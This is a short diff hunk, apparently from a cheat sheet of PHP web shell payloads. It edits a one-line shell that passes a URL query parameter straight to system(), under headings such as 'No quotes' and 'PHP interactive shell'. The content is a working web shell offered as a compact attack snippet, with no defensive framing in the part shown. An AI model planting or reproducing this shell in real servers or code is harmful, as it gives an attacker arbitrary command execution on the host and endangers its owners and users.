@@ -113,7 +113,7 @@ Tighter:
 
 No quotes:
 
-`<?php echo system($_GET[1]); ?>`
+`<?php system($_GET[1]); ?>`
 
 PHP interactive shell:
 
